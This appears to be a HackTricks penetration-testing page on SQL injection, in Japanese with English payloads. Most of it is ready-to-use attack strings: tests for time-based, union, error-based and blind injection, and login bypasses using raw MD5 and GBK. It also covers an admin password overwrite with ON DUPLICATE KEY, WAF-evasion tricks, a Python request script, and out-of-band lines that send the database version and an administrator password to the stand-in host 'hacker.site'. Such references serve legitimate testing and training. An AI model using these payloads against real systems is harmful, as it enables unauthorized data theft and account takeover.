# SQL Injection

{{#include ../../banners/hacktricks-training.md}}

## SQLインジェクションとは？

**SQLインジェクション**は、攻撃者がアプリケーションのデータベースクエリに**干渉する**ことを可能にするセキュリティの欠陥です。この脆弱性により、攻撃者は**見る**、**変更する**、または**削除する**ことができないデータにアクセスできるようになり、他のユーザーの情報やアプリケーションがアクセスできるデータを含みます。このような行動は、アプリケーションの機能やコンテンツに永続的な変更をもたらしたり、サーバーの侵害やサービス拒否を引き起こす可能性があります。

## エントリーポイントの検出

サイトがSQLi関連の入力に対して異常なサーバー応答を示す場合、**SQLインジェクション（SQLi）**に**脆弱である**と見なされます。**最初のステップ**は、**クエリを中断することなくデータを注入する**方法を理解することです。これには、現在のコンテキストから**効果的にエスケープする**方法を特定する必要があります。以下は役立ついくつかの例です：
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
次に、**エラーが出ないようにクエリを修正する方法**を知っておく必要があります。クエリを修正するためには、**データを入力**して**前のクエリが新しいデータを受け入れる**ようにするか、単に**データを入力**して**最後にコメント記号を追加**することができます。

_エラーメッセージが見える場合や、クエリが正常に動作しているときとそうでないときの違いを見つけることができる場合、このフェーズはより簡単になります。_

### **コメント**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### 論理演算による確認

SQLインジェクションの脆弱性を確認する信頼できる方法は、**論理演算**を実行し、期待される結果を観察することです。例えば、`?username=Peter`というGETパラメータが`?username=Peter' or '1'='1`に変更しても同じ内容が得られる場合、SQLインジェクションの脆弱性が示されます。

同様に、**数学的演算**の適用も効果的な確認手法です。例えば、`?id=1`と`?id=2-1`にアクセスして同じ結果が得られる場合、SQLインジェクションを示唆しています。

論理演算による確認を示す例:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
この単語リストは、提案された方法で**SQLインジェクションを確認する**ために作成されました：

{{#file}}
sqli-logic.txt
{{#endfile}}

### タイミングによる確認

場合によっては、テストしているページに**変化が見られない**ことがあります。したがって、**ブラインドSQLインジェクションを発見する**良い方法は、DBにアクションを実行させ、ページの読み込みに**時間に影響を与える**ことです。\
したがって、SQLクエリに完了するのに多くの時間がかかる操作を連結します：
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
場合によっては、**スリープ関数が許可されない**ことがあります。その場合、これらの関数を使用する代わりに、**複雑な操作を実行する**クエリを作成することができます。_これらの技術の例は、各技術ごとに別々にコメントされる予定です（もしあれば）_。

### バックエンドの特定

バックエンドを特定する最良の方法は、異なるバックエンドの関数を実行しようとすることです。前のセクションの_**スリープ**_ **関数**や、次のものを使用できます（[payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)の表）：
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
また、クエリの出力にアクセスできる場合は、**データベースのバージョンを表示させる**ことができます。

> [!NOTE]
> 続いて、異なる種類のSQLインジェクションを悪用するためのさまざまな方法について説明します。例としてMySQLを使用します。

### PortSwiggerを使用した識別

{{#ref}}
https://portswigger.net/web-security/sql-injection/cheat-sheet
{{#endref}}

## ユニオンベースの悪用

### カラム数の検出

クエリの出力が見える場合、これは悪用するための最良の方法です。\
まず最初に、**初期リクエスト**が返す**カラム**の**数**を特定する必要があります。これは、**両方のクエリが同じ数のカラムを返す必要があるため**です。\
この目的のために通常使用される2つの方法があります：

#### Order/Group by

クエリ内のカラム数を特定するには、**ORDER BY**または**GROUP BY**句で使用される数を段階的に調整し、誤った応答が返されるまで続けます。SQL内の**GROUP BY**と**ORDER BY**の異なる機能にもかかわらず、両方はクエリのカラム数を特定するために同様に利用できます。
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

クエリが正しくなるまで、どんどんnull値を選択します:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_クエリの両側の列の型が同じでなければならない場合があるため、`null`値を使用する必要があります。nullはすべてのケースで有効です。_

### データベース名、テーブル名、および列名の抽出

次の例では、すべてのデータベースの名前、データベースのテーブル名、テーブルの列名を取得します：
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_このデータを発見する方法は、異なるデータベースごとに異なりますが、常に同じ方法論です。_

## 隠れたユニオンベースの悪用

クエリの出力が表示されているが、ユニオンベースのインジェクションが達成できない場合、それは**隠れたユニオンベースのインジェクション**の存在を示しています。このシナリオは、しばしばブラインドインジェクションの状況につながります。ブラインドインジェクションをユニオンベースのものに変換するには、バックエンドでの実行クエリを特定する必要があります。

これは、ブラインドインジェクション技術とターゲットのデータベース管理システム（DBMS）に特有のデフォルトテーブルを使用することで達成できます。これらのデフォルトテーブルを理解するためには、ターゲットDBMSのドキュメントを参照することをお勧めします。

クエリが抽出されたら、元のクエリを安全に閉じるようにペイロードを調整する必要があります。その後、ユニオンクエリをペイロードに追加し、新たにアクセス可能なユニオンベースのインジェクションを悪用できるようにします。

より包括的な洞察については、[Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f)で利用可能な完全な記事を参照してください。

## エラーベースの悪用

何らかの理由で**クエリ**の**出力**を見ることができないが、**エラーメッセージ**を見ることができる場合、これらのエラーメッセージを使用してデータベースからデータを**抽出**することができます。\
ユニオンベースの悪用と同様の流れに従うことで、DBをダンプすることができるかもしれません。
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Blind SQLiの悪用

この場合、クエリの結果やエラーを見ることはできませんが、クエリが**true**または**false**の応答を**返す**ときに、ページ上の異なる内容によって**区別**することができます。\
この場合、その動作を悪用してデータベースを文字ごとにダンプすることができます:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## エラー盲目的SQLiの悪用

これは**以前と同じケース**ですが、クエリからの真/偽の応答を区別する代わりに、SQLクエリの**エラー**があるかどうかを**区別する**ことができます（おそらくHTTPサーバーがクラッシュするため）。したがって、この場合、正しく文字を推測するたびにSQLエラーを強制することができます:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## 時間ベースのSQLiの悪用

この場合、ページのコンテキストに基づいてクエリの**応答**を**区別する**方法は**ありません**。しかし、推測した文字が正しい場合、ページが**読み込むのに時間がかかる**ようにすることができます。この技術は、[タイミングで確認する](#confirming-with-timing)ために以前に使用されているのを見たことがあります。
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## スタッククエリ

スタッククエリを使用して、**複数のクエリを連続して実行**できます。後続のクエリが実行される間、**結果**は**アプリケーションに返されない**ことに注意してください。したがって、この技術は主に**ブラインド脆弱性**に関連して使用され、2番目のクエリを使用してDNSルックアップ、条件付きエラー、またはタイムディレイをトリガーできます。

**Oracle**は**スタッククエリ**をサポートしていません。**MySQL、Microsoft**、および**PostgreSQL**はそれをサポートしています: `QUERY-1-HERE; QUERY-2-HERE`

## アウトオブバンドエクスプロイト

**他の**エクスプロイト手法が**機能しなかった**場合、**データベースが情報をあなたが制御する**外部ホストに**流出させる**ように試みることができます。たとえば、DNSクエリを介して:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### XXEを介したアウトオブバンドデータ流出
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## 自動化エクスプロイト

[SQLMap Cheatsheet](sqlmap/index.html)を確認して、[**sqlmap**](https://github.com/sqlmapproject/sqlmap)を使用してSQLi脆弱性を悪用してください。

## 技術特有の情報

SQLインジェクション脆弱性を悪用する方法についてはすでに議論しました。この本でデータベース技術に依存するいくつかのトリックを見つけてください：

- [MS Access](ms-access-sql-injection.md)
- [MSSQL](mssql-injection.md)
- [MySQL](mysql-injection/index.html)
- [Oracle](oracle-injection.md)
- [PostgreSQL](postgresql-injection/index.html)

また、**MySQL、PostgreSQL、Oracle、MSSQL、SQLite、HQLに関する多くのトリックが** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)にあります。

## 認証バイパス

ログイン機能をバイパスするために試すリスト：

{{#ref}}
../login-bypass/sql-login-bypass.md
{{#endref}}

### 生のハッシュ認証バイパス
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
このクエリは、認証チェックで生の出力に対してtrueを使用してMD5が使用されるときの脆弱性を示しています。これにより、システムはSQLインジェクションに対して脆弱になります。攻撃者は、ハッシュ化されたときに予期しないSQLコマンドの一部を生成する入力を作成することでこれを悪用し、不正アクセスを引き起こすことができます。
```sql
md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```
### インジェクションされたハッシュ認証バイパス
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**推奨リスト**:

各行のリストをユーザー名として使用し、パスワードは常に: _**Pass1234.**_\
_(このペイロードは、このセクションの最初に言及された大きなリストにも含まれています)_

{{#file}}
sqli-hashbypass.txt
{{#endfile}}

### GBK 認証バイパス

IF ' がエスケープされている場合は %A8%27 を使用でき、' がエスケープされると次のように作成されます: 0xA80x5c0x27 (_╘'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python スクリプト:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### ポリグロットインジェクション（マルチコンテキスト）
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### 既存のオブジェクト/ユーザーのパスワードを変更する

そのためには、**「マスターオブジェクト」と名付けられた新しいオブジェクトを作成する**（おそらく**admin**の場合）ために何かを変更する必要があります：

- 名前を**AdMIn**（大文字と小文字の文字）にしてユーザーを作成する
- 名前を**admin=**にしてユーザーを作成する
- **SQLトランケーション攻撃**（ユーザー名やメールに**長さ制限**がある場合） --> 名前を**admin \[たくさんのスペース] a**にしてユーザーを作成する

#### SQLトランケーション攻撃

データベースが脆弱で、ユーザー名の最大文字数が例えば30の場合、ユーザー**admin**を偽装したい場合は、"_admin \[30スペース] a_"というユーザー名を作成し、任意のパスワードを使用してみてください。

データベースは、入力された**ユーザー名**がデータベース内に**存在するか**を**確認**します。もし**存在しなければ**、**ユーザー名**を**最大許可文字数**（この場合は"_admin \[25スペース]_"に）**切り捨て**、その後、**自動的に末尾のすべてのスペースを削除して**データベース内のユーザー"**admin**"を**新しいパスワード**で更新します（エラーが表示される可能性がありますが、これは成功しなかったことを意味しません）。

詳細情報: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_注：この攻撃は、最新のMySQLインストールでは上記のようには機能しなくなります。比較はデフォルトで末尾の空白を無視しますが、フィールドの長さよりも長い文字列を挿入しようとするとエラーが発生し、挿入は失敗します。このチェックに関する詳細情報は:_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)

### MySQL挿入時間ベースのチェック

`','',''`をできるだけ追加して、VALUESステートメントを終了させると考えます。遅延が実行される場合、SQLインジェクションがあります。
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

`ON DUPLICATE KEY UPDATE`句は、MySQLで、UNIQUEインデックスまたはPRIMARY KEYで重複する値をもたらす行を挿入しようとしたときに、データベースが取るべきアクションを指定するために使用されます。以下の例は、この機能がどのように悪用されて管理者アカウントのパスワードを変更するために使用されるかを示しています。

Example Payload Injection:

注入ペイロードは次のように作成される可能性があり、`users`テーブルに2行を挿入しようとしています。最初の行はおとりで、2行目は既存の管理者のメールアドレスをターゲットにしてパスワードを更新する意図があります：
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
以下はその仕組みです：

- クエリは2つの行を挿入しようとします：1つは `generic_user@example.com` 用、もう1つは `admin_generic@example.com` 用です。
- `admin_generic@example.com` の行がすでに存在する場合、`ON DUPLICATE KEY UPDATE` 句がトリガーされ、MySQLに既存の行の `password` フィールドを "bcrypt_hash_of_newpassword" に更新するよう指示します。
- その結果、`admin_generic@example.com` を使用して、bcryptハッシュに対応するパスワードで認証を試みることができます（"bcrypt_hash_of_newpassword" は新しいパスワードのbcryptハッシュを表し、実際のパスワードのハッシュに置き換える必要があります）。

### 情報を抽出する

#### 同時に2つのアカウントを作成する

新しいユーザーを作成しようとする際には、ユーザー名、パスワード、メールアドレスが必要です：
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### 10進数または16進数の使用

この技術を使用すると、1つのアカウントを作成するだけで情報を抽出できます。コメントをする必要はないことに注意してください。

**hex2dec** と **substr** を使用して:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
テキストを取得するには、次のようにします:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
**hex** と **replace** (および **substr**) を使用して:
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
## ルーティッドSQLインジェクション

ルーティッドSQLインジェクションは、注入可能なクエリが出力を生成するものではなく、注入可能なクエリの出力が出力を生成するクエリに渡される状況です。 ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

例:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF バイパス

[初期バイパスはこちらから](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### スペースなしバイパス

No Space (%20) - ホワイトスペースの代替を使用してバイパス
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
ホワイトスペースなし - コメントを使用してバイパス
```sql
?id=1/*comment*/and/**/1=1/**/--
```
ホワイトスペースなし - 括弧を使用してバイパス
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

No Comma - OFFSET、FROM、JOINを使用したバイパス
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### 一般的なバイパス

キーワードを使用したブラックリスト - 大文字/小文字を使用してバイパス
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
キーワードを使用したブラックリスト（大文字と小文字を区別しない） - 同等の演算子を使用してバイパス
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Scientific Notation WAF バイパス

このトリックの詳細な説明は[gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)で見つけることができます。\
基本的に、WAFをバイパスするために科学的表記を予期しない方法で使用することができます：
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### カラム名制限のバイパス

まず最初に、**元のクエリとフラグを抽出したいテーブルが同じ数のカラムを持っている場合**、次のようにすることができます: `0 UNION SELECT * FROM flag`

**名前を使用せずにテーブルの第三カラムにアクセスすることが可能です**。次のようなクエリを使用します: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`。したがって、sqlinjectionでは次のようになります:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
**カンマバイパス**を使用すること：
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
このトリックは[https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)から取られました。

### WAFバイパス提案ツール

{{#ref}}
https://github.com/m4ll0k/Atlas
{{#endref}}

## その他のガイド

- [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## ブルートフォース検出リスト

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt
{{#endref}}

​
{{#include ../../banners/hacktricks-training.md}}
